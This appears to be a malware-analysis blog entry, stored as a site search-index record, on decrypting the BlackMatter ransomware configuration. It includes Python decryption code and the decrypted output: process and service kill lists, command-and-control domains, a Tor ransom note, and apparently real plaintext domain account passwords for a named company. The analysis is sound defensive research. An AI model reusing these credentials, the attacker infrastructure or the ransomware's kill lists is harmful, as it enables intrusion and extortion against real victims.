xa5 xc8 xe6 x8fro4BrnX5Zms1fmgmp9Hypi0hCgPduMrclWUIq05OADb1eHAmezreXJI46rfXbELjszc67ztiIrrUJUtMlON1LsA7puHNgfKMOAvLUpTmZlNYac7GNXnwBwAAAAA= x00UqLSghWqzIY3WZfbVqvI/NH3zsibCQc59aY6wgDsa4SWrgzwNariy+RXqoUAAAAA x00k8UWrwAbmN9xl+JkwBxI3YAbWNsAHijNQBgQycAYkOlAGKDHgBywywAdgOfAHIDdgBww48AcGN3AGHjVQBnI2cAYwOHxlLpKMZbiSgAZEOMAHMDxABuA04CrnsnAG2jnABtgy9u3a0rAGyDdwByI4cAYmNUAHQjTQBpwx0AbIMmAG0jFAA6wZ8DYXuFAHZDJABnA1UAemOnAG2jJ/sv8oQAamOkAGTDbepsuzQAcCN03eMpMABxg6QAcYMkAGbDFwBhg1cAcqN0AAAAA x00ZQBuAGMAcwB2AGMAAAB0AGgAZQBiAGEAdAAAAG0AeQBkAGUAcwBrAHQAbwBwAHEAbwBzAAAAeABmAHMAcwB2AGMAYwBvAG4AAABmAGkAcgBlAGYAbwB4AAAAaQBuAGYAbwBwAGEAdABoAAAAdwBpAG4AdwBvAHIAZAAAAHMAdABlAGEAbQAAAHMAeQBuAGMAdABpAG0AZQAAAG4AbwB0AGUAcABhAGQAAABvAGMAbwBtAG0AAABvAG4AZQBuAG8AdABlAAAAbQBzAHAAdQBiAAAAdABoAHUAbgBkAGUAcgBiAGkAcgBkAAAAYQBnAG4AdABzAHYAYwAAAHMAcQBsAAAAZQB4AGMAZQBsAAAAcABvAHcAZQByAHAAbgB0AAAAbwB1AHQAbABvAG8AawAAAHcAbwByAGQAcABhAGQAAABkAGIAZQBuAGcANQAwAAAAaQBzAHEAbABwAGwAdQBzAHMAdgBjAAAAcwBxAGIAYwBvAHIAZQBzAGUAcgB2AGkAYwBlAAAAbwByAGEAYwBsAGUAAABvAGMAYQB1AHQAbwB1AHAAZABzAAAAZABiAHMAbgBtAHAAAABtAHMAYQBjAGMAZQBzAHMAAAB0AGIAaQByAGQAYwBvAG4AZgBpAGcAAABvAGMAcwBzAGQAAABtAHkAZABlAHMAawB0AG8AcABzAGUAcgB2AGkAYwBlAAAAdgBpAHMAaQBvAAAAAAA= x00bQBlAHAAbwBjAHMAAABtAGUAbQB0AGEAcwAAAHYAZQBlAGEAbQAAAHMAdgBjACQAAABiAGEAYwBrAHUAcAAAAHMAcQBsAAAAdgBzAHMAAABtAHMAZQB4AGMAaABhAG4AZwBlAAAAAAC= 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&#39; . import base64 ptr = 0 rsa_data = ptxt_data[ptr:128] ptr += 128 affiliate_id_data = ptxt_data[ptr:ptr+32] ptr+= 32 config_flags = ptxt_data[ptr:ptr+22] ptr+= 9 config_values_offset = struct.unpack(&#39;&lt;I&#39;,ptxt_data[ptr:ptr+4])[0] config_values_buffer = ptxt_data[ptr+config_values_offset:] config_values = [] for c in config_values_buffer.split(b&#39; x00&#39;): config_values.append(base64.b64decode(c)) def is_ascii(s): return all(c &lt; 128 for c in s) print(&quot;RSA: %r n&quot; % rsa_data) print(&quot;Affiliate ID: %r n&quot; % affiliate_id_data) print(&quot;Flags: %s n&quot; % tohex(config_flags)) for c in config_values: if not is_ascii(c): c = new_data = decrypt(c,len(c), seed) print(&quot;%s n&quot; % b&#39; | &#39;.join([s.replace(b&#39; x00&#39;,b&#39;&#39;) for s in c.split(b&#39; x00 x00&#39;)])) . RSA: b&#39; xd17x x9d xcb~ x8f x9d xf1 xb4 xc5b x8f x95Tq[ x87 xf0 xfc x89 xa8 xe5 xf2 x81 xda xbd x87 x17g xd8 xb2 x97 x92 jS x1dp xf53`Ei xc7 x88 xfb xdab:5 x8a xcb xf0 x186 x15 x98 xe4l} xa3 xe5 xd3V{bY&#34; x969 xc3 x01f3 x13t~ x0cuu xe5 xd6 x1aGu x9ff x00 xbd x8emFU x99Zga x95 x08w xd4 x9d r xe0 x8e xe3 x06 / xaa x14 xcd xffR x01 x81 xd7 xea x00 xf0 x7f xc9 x87 x88i&#39; Affiliate ID: b&#39;NY x1a1 T xe8 x80 r xaeqC U_ xa5 xb9 xa7{ xca^(^ x06 xd5 t xae&#34; x93 xa4X&gt;&#39; Flags: b&#39;0001010101010101012c000000a9000000ea00000000&#39; b&#39;0 xc1 xbdW x89 x82 xd1f x82 x8d x90- - x88914 xfa xb2 xeba rIH( x8f xe8V!hQ? xf5 x83 xd2&amp;p xe7 x92 xe1 xd2 x95B xda xa0 xe2 xc6 x9bO xd9 x92 xb5p x1a xd9- xf0 x7f xf8 x89 x98 x89 x87v xb1 xe3 x83 x90 xf4Sf xd7 xb12 x0czE)C xac x8a L x15. xe9W&#39; b&#39; xcc xedn{ xe9 xd1{ x8b x80 xaao xd0 xadW xb2c xcd xe2&gt;y xad xd0 xc0 xac( xeb xbd x81 x18 x83 x03 xe3 # xff x04h xe0 xdb x05&#39; b&#34; r x8a xaaV xfc`/ xd2 xc6d x1ao; xe02B x9c x0e xa8j6 xc7 xefX x9dU x97 x8a xd8w xf8 x8e x8a x95S3 xddV x89 x05s xf7 xff x12 xcd xd0 xf8 xa8d xd3 x9eN x0e xbe9 xcdLa]b4pv x92 x85 x83 xac xe1 x1b xa0 xde, x1b x14 xee xba_ xf3 xf4 xff.{ L x99 x83U6 xe5w x9f x10? xc6b xbe] xed&#39;p xc1 xeb xca x04 xcf xc8 xa9 x12a@ x9f x87lm xf1 x0831 xef x08 xde x15 xcd xbd x08N xdb xe1) x91(v4 xe7^$h x84 xe3 xa9 x8c xcco x80 x97 x9c x93 xc6U rSn xcca xce xb5 xae xfa x08 xcb xf8 xab xe9 x88 xc2 x99 xe4 x19 x9eO x94 x97 xea xef x16 x14 x1a xcbf* xb3 xe9o xa2 xd9!_ x9f xd2&amp;((f x84 xd1 x10 xa2&#34; b&#39;encsvc | thebat | mydesktopqos | xfssvccon | firefox | infopath | winword | steam | synctime | notepad | ocomm | onenote | mspub | thunderbird | agntsvc | sql | excel | powerpnt | outlook | wordpad | dbeng50 | isqlplussvc | sqbcoreservice | oracle | ocautoupds | dbsnmp | msaccess | tbirdconfig | ocssd | mydesktopservice | visio | | &#39; b&#39;mepocs | memtas | veeam | svc$ | backup | sql | vss | msexchange | | &#39; b&#39;https://fluentzip.org | http://fluentzip.org | | &#39; b&#39;OFMO220@R5-CORE.R5.AIG.NET:yhU6VJ$&amp;amp | nq7tA9 | OSYST93@R5-CORE.R5.AIG.NET:RPo@ndf9 | OFMO225@R5-CORE.R5.AIG.NET:DH5U87@rA0ELa2 | &#39; b&#34; ~+ r n * + r n &#39; BLACK | r n () .-.,=&#39;``&#39;=. - o - r n &#39;=/_ | r n * | &#39;=._ | r n `=./`, &#39; r n . &#39;=.__.=&#39; `=&#39; * r n + Matter + r n O * &#39; . r n r n&gt;&gt;&gt; What happens? r n Your network is encrypted, and currently not operational. r n We need only money, after payment we will give you a decryptor for the entire network and you will restore all the data. r n r n&gt;&gt;&gt; What data stolen? r n From your network was stolen large amount of data. r n If you do not contact us we will publish all your data in our blog and will send it to the biggest mass media. r n r n&gt;&gt;&gt; What guarantees? r n We are not a politically motivated group and we do not need anything other than your money. r n If you pay, we will provide you the programs for decryption and we will delete your data. r n If we do not give you decrypters or we do not delete your data, no one will pay us in the future, this does not comply with our goals. r n We always keep our promises. r n r n&gt;&gt; How to contact with us? r n 1. Download and install TOR Browser (https://www.torproject.org/). r n 2. Open http://supp24maprinktc7uizgfyqhisx7lkszb6ogh6lwdzpac23w3mh4tvyd.onion/U6H6RKDF6W3B8XOWL r n r n&gt;&gt; Warning! Recovery recommendations. r n We strongly recommend you to do not MODIFY or REPAIR your files, that will damag&#34; .",
            "url": "https://research.openanalysis.net/blackmatter/ransomware/malware/config/2021/10/30/blackmatter_ransomware_v3.html",
            "relUrl": "/blackmatter/ransomware/malware/config/2021/10/30/blackmatter_ransomware_v3.html",
            "date": " • Oct 30, 2021"
        }
        
    
  
    
        ,"post30": {
            "title": "BlackMatter Ransomware",
            "content": "Overview . Sample: 22d7d67c3af10b1a37f277ebabe2d1eb4fd25afbd6437d4377400e148bcc08d6 . References: . Malware Bazaar Sample | ChuongDong Blog | CARBON SPIDER Attribution | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . API Hashing . def ror(value, count=1, base=8): value = (value &gt;&gt; count | value &lt;&lt; (base - count)) &amp; (2**base - 1) return value . out = 0 for i in &#39;ntdll.dll x00&#39;: out = (ord(i) + ror(out, count=13, base=32)) &amp; 0xffffffff print(hex(out)) . 0x411677b7 . Config Decryption . APLib . Credit: Sandor Nemes (snemes) . import struct from binascii import crc32 from io import BytesIO __all__ = [&#39;APLib&#39;, &#39;decompress&#39;] __version__ = &#39;0.6&#39; __author__ = &#39;Sandor Nemes&#39; class APLib(object): __slots__ = &#39;source&#39;, &#39;destination&#39;, &#39;tag&#39;, &#39;bitcount&#39;, &#39;strict&#39; def __init__(self, source, strict=True): self.source = BytesIO(source) self.destination = bytearray() self.tag = 0 self.bitcount = 0 self.strict = bool(strict) def getbit(self): # check if tag is empty self.bitcount -= 1 if self.bitcount &lt; 0: # load next tag self.tag = ord(self.source.read(1)) self.bitcount = 7 # shift bit out of tag bit = self.tag &gt;&gt; 7 &amp; 1 self.tag &lt;&lt;= 1 return bit def getgamma(self): result = 1 # input gamma2-encoded bits while True: result = (result &lt;&lt; 1) + self.getbit() if not self.getbit(): break return result def depack(self): r0 = -1 lwm = 0 done = False try: # first byte verbatim self.destination += self.source.read(1) # main decompression loop while not done: if self.getbit(): if self.getbit(): if self.getbit(): offs = 0 for _ in range(4): offs = (offs &lt;&lt; 1) + self.getbit() if offs: self.destination.append(self.destination[-offs]) else: self.destination.append(0) lwm = 0 else: offs = ord(self.source.read(1)) length = 2 + (offs &amp; 1) offs &gt;&gt;= 1 if offs: for _ in range(length): self.destination.append(self.destination[-offs]) else: done = True r0 = offs lwm = 1 else: offs = self.getgamma() if lwm == 0 and offs == 2: offs = r0 length = self.getgamma() for _ in range(length): self.destination.append(self.destination[-offs]) else: if lwm == 0: offs -= 3 else: offs -= 2 offs &lt;&lt;= 8 offs += ord(self.source.read(1)) length = self.getgamma() if offs &gt;= 32000: length += 1 if offs &gt;= 1280: length += 1 if offs &lt; 128: length += 2 for _ in range(length): self.destination.append(self.destination[-offs]) r0 = offs lwm = 1 else: self.destination += self.source.read(1) lwm = 0 except (TypeError, IndexError): if self.strict: raise RuntimeError(&#39;aPLib decompression error&#39;) return bytes(self.destination) def pack(self): raise NotImplementedError def aplib_decompress(data, strict=False): packed_size = None packed_crc = None orig_size = None orig_crc = None if data.startswith(b&#39;AP32&#39;) and len(data) &gt;= 24: # data has an aPLib header header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(&#39;=IIIII&#39;, data, 4) data = data[header_size : header_size + packed_size] if strict: if packed_size is not None and packed_size != len(data): raise RuntimeError(&#39;Packed data size is incorrect&#39;) if packed_crc is not None and packed_crc != crc32(data): raise RuntimeError(&#39;Packed data checksum is incorrect&#39;) result = APLib(data, strict=strict).depack() if strict: if orig_size is not None and orig_size != len(result): raise RuntimeError(&#39;Unpacked data size is incorrect&#39;) if orig_crc is not None and orig_crc != crc32(result): raise RuntimeError(&#39;Unpacked data checksum is incorrect&#39;) return result . Extract Config . The Blackmatter config is stored in the PE resource section .rsrc. . The first DWORD of the resource is the seed for an lcg that closely matches the zipcrypto lcg with constant 0x8088405. . The second DWORD is the size of the encrypted config and is followed by the encrypted config data. . import struct import pefile RANSOMWARE_FILE = r&#39;/tmp/blackmatter.bin&#39; data = open(RANSOMWARE_FILE, &#39;rb&#39;).read() pe = pefile.PE(data = data) # Get resource data r_data = None for s in pe.sections: if b&#39;rsrc&#39; in s.Name: r_data = s.get_data() # Parse data from resource seed = struct.unpack(&#39;&lt;I&#39;,r_data[:4])[0] data_size = struct.unpack(&#39;&lt;I&#39;,r_data[4:8])[0] enc_data = r_data[8:] print(&quot;Seed: %s&quot; % hex(seed)) print(&quot;Size: %d&quot; % data_size) . Seed: 0xffcaa1ea Size: 3487 . Decryption Routine . Reference: Tesorion Blackmatter blog . def decrypt(enc_data, data_size, seed): fixed = seed decrypted = bytearray() for i in range(data_size-1): if i &amp; 3 == 0: next_value = struct.unpack(&#39;&lt;I&#39;,enc_data[i:i+4])[0] seed = (0x8088405 * seed + 1) &amp; 0xffffffff rnd = ((seed * fixed) &gt;&gt; 32) &amp; 0xffffffff dw = next_value ^ rnd decrypted.append((dw &gt;&gt; ((i &amp; 3) * 8)) &amp; 0xff) return decrypted . def gen_key_stream(seed, key_length): fixed = seed keystream = b&#39;&#39; for i in range(0,key_length-1,4): seed = (0x8088405 * seed + 1) &amp; 0xffffffff key_dw = ((seed * fixed) &gt;&gt; 32) &amp; 0xffffffff keystream += struct.pack(&#39;&lt;I&#39;,key_dw) return keystream def decrypt(enc_data, data_size, seed): out = [] keystream = gen_key_stream(seed, data_size) for i in range(data_size): out.append(enc_data[i] ^ keystream[i]) return bytes(out) ap_data = decrypt(enc_data, data_size, seed) ptxt_data = aplib_decompress(ap_data) ptxt_data . b&#39; x87 x19 xa80 xf4 xba x94 x94 x92 x91X+fT xf9l x96 xd9 xa0 xf4A x9fR xf3g xcf. x19 xb9 xc9Z x9bp x91 xcb xef xaf xbeZ xe3 x9d xae(X x94Y n x8d xb8 xb7d xe5r xfa xb5#FF xf8e x9a xda/ xbd x8c7 xbf xdd xd6 x07 x97 xa5 xad x9d xad- xed7 x96 x9d x17 x9e xa4 xadL x19 x80 xd0 xe7 x0b x05bA xd3% xe1 x8b xeb xc4 x92_ xa5j xbf x81 x0f x91ny2 xd0 x16 xa8n: xd9wI xe7_ x901 x11K x06 x0bVQ$x xc0 x8d xad xa2 xaf x19 xe4 x98 x08 xfb xda[ x0b xa6 xf30 xb0 x9c xd4{O xb9!Ox6 xaaF xad x00 x01 x01 x01 x01 x01 x01 x01$ x00 x00 x00 xa1 x00 x00 x00 xe2 x00 x00 x00 x00 x00 x00 x00 xf3 x01 x00 x00 xc8 x04 x00 x009 x05 x00 x002 x06 x00 x00 x1f x07 x00 x00ro4BrnX5Zms1fmgmp9Hypi0hCgPduMrclWUIq05OADb1eHAmezreXJI46rfXbELjszc67ztiIrrUJUtMlON1LsA7puHNgfKMOAvLUpTmZlNYac7GNXnwBwAAAAB= x00UqLSghWqzIY3WZfbVqvI/NH3zsibCQc59aY6wgDsa4SWrgzwNariy+RXqoUAAAAA x00k8UWrwAbmN9xl+JkwBxI3YAbWNsAHijNQBgQycAYkOlAGKDHgBywywAdgOfAHIDdgBww48AcGN3AGHjVQBnI2cAYwOHxlLpKMZbiSgAZEOMAHMDxABuA04CrnsnAG2jnABtgy9u3a0rAGyDdwByI4cAYmNUAHQjTQBpwx0AbIMmAG0jFAA6wZ8DYXuFAHZDJABnA1UAemOnAG2jJ/sv8oQAamOkAGTDbepsuzQAcCN03eMpMABxg6QAcYMkAGbDFwBhg1cAcqN0AAAAA x00ZQBuAGMAcwB2AGMAAAB0AGgAZQBiAGEAdAAAAG0AeQBkAGUAcwBrAHQAbwBwAHEAbwBzAAAAeABmAHMAcwB2AGMAYwBvAG4AAABmAGkAcgBlAGYAbwB4AAAAaQBuAGYAbwBwAGEAdABoAAAAdwBpAG4AdwBvAHIAZAAAAHMAdABlAGEAbQAAAHMAeQBuAGMAdABpAG0AZQAAAG4AbwB0AGUAcABhAGQAAABvAGMAbwBtAG0AAABvAG4AZQBuAG8AdABlAAAAbQBzAHAAdQBiAAAAdABoAHUAbgBkAGUAcgBiAGkAcgBkAAAAYQBnAG4AdABzAHYAYwAAAHMAcQBsAAAAZQB4AGMAZQBsAAAAcABvAHcAZQByAHAAbgB0AAAAbwB1AHQAbABvAG8AawAAAHcAbwByAGQAcABhAGQAAABkAGIAZQBuAGcANQAwAAAAaQBzAHEAbABwAGwAdQBzAHMAdgBjAAAAcwBxAGIAYwBvAHIAZQBzAGUAcgB2AGkAYwBlAAAAbwByAGEAYwBsAGUAAABvAGMAYQB1AHQAbwB1AHAAZABzAAAAZABiAHMAbgBtAHAAAABtAHMAYQBjAGMAZQBzAHMAAAB0AGIAaQByAGQAYwBvAG4AZgBpAGcAAABvAGMAcwBzAGQAAABtAHkAZABlAHMAawB0AG8AcABzAGUAcgB2AGkAYwBlAAAAdgBpAHMAaQBvAAAAAAA= x00bQBlAHAAbwBjAHMAAABtAGUAbQB0AGEAcwAAAHYAZQBlAGEAbQAAAHMAdgBjACQAAABiAGEAYwBrAHUAcAAAAHMAcQBsAAAAdgBzAHMAAAAAAM== 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 x00&#39; . import base64 ptr = 0 rsa_data = ptxt_data[ptr:128] ptr += 128 affiliate_id_data = ptxt_data[ptr:ptr+32] ptr+= 32 config_flags = ptxt_data[ptr:ptr+22] ptr+= 8 config_values_offset = struct.unpack(&#39;&lt;I&#39;,ptxt_data[ptr:ptr+4])[0] config_values_buffer = ptxt_data[ptr+config_values_offset:] config_values = [] for c in config_values_buffer.split(b&#39; x00&#39;): config_values.append(base64.b64decode(c)) . def is_ascii(s): return all(c &lt; 128 for c in s) print(&quot;RSA: %r n&quot; % rsa_data) print(&quot;Affiliate ID: %r n&quot; % affiliate_id_data) print(&quot;Flags: %s n&quot; % tohex(config_flags)) for c in config_values: if not is_ascii(c): c = new_data = decrypt(c,len(c), seed) print(&quot;%s n&quot; % b&#39; | &#39;.join([s.replace(b&#39; x00&#39;,b&#39;&#39;) for s in c.split(b&#39; x00 x00&#39;)])) . RSA: b&#39; x87 x19 xa80 xf4 xba x94 x94 x92 x91X+fT xf9l x96 xd9 xa0 xf4A x9fR xf3g xcf. x19 xb9 xc9Z x9bp x91 xcb xef xaf xbeZ xe3 x9d xae(X x94Y n x8d xb8 xb7d xe5r xfa xb5#FF xf8e x9a xda/ xbd x8c7 xbf xdd xd6 x07 x97 xa5 xad x9d xad- xed7 x96 x9d x17 x9e xa4 xadL x19 x80 xd0 xe7 x0b x05bA xd3% xe1 x8b xeb xc4 x92_ xa5j xbf x81 x0f x91ny2 xd0 x16 xa8n: xd9wI xe7_ x901 x11K x06 x0bV&#39; Affiliate ID: b&#39;Q$x xc0 x8d xad xa2 xaf x19 xe4 x98 x08 xfb xda[ x0b xa6 xf30 xb0 x9c xd4{O xb9!Ox6 xaaF xad&#39; Flags: b&#39;000101010101010124000000a1000000e20000000000&#39; b&#39; xc4 xe2 x95wo xed9&gt; x10 xdb x16 xd9. xa5 x01 xcc xaeP xc4t xdc xb0 xbc xf5 xe2 x860 xde x9e x1b x81Q x91 x0e xc9 x7f xe4Y xe6 x8aX*~ x0e x84W xb0 xed x1aA xe9f x10 x0fq xbd x1eg x02z xa7 xac[ xa9z x9el x1b xe1 x1f xb8 xb1, xbepPX: xcc xb1L xc0 xc0 x13 x943 x99 x05 x97 x14CT&#39; b&#39;8 xceF[ x0f xbe x93 xd3 x12 xfc xe9$ xdf xdf; x96R x86 xbf x9a x01q x10 x82E x02 xb7 xd0 xb9 xea xe3 xf2 xd8 xb5 xa9 xaa xc9 xda x1d.E&gt;&lt;S; xf2 x0e&#39; b&#34; xf9 xa9 x82v x1a x0f xc7 x8aT2 x9c x9bIh xbb xb7 x03j x96 xac x01 x16^ xe47 xfb( xbc x10M x11 x8e$n x19 x9e x1f x7f x88 x1d xca x0f x14^ x93&#39;r xd3)j xe3j xebqK xda nZ1 xe3sV xe6^z xbd n x1b xdd n xf0w%#YH xcc xc5 xba x01 x14 xb5 xce$ xa1Q xe9 xd1 x17 xbf xdd x9d xe2 x11 xc0 x9aL!~ xf0a x83 xa9:m x04 xd3O n xd6_t xd04 xe0 xe4 x83 xd6 xc2 xb9 tB&amp; x18^ xa3Y xd0 xf3 xe6{S xa3 x9d xcby xef xc8z xf7/ xd4./ x07N xa3 x86% xba xe5X xb8W xa4Ry xe3 rZ x1c xf4 xbd xd1 xc4{o xe9 xea1 xc9 xb2P x030 x92 xab9 xe6js; xb2 xce x87 xcf xdfw xba xf6^ x88 xdc xb7 xf7 xa8N xa23 x83v xe9 x8e xb2&#34; b&#39;encsvc | thebat | mydesktopqos | xfssvccon | firefox | infopath | 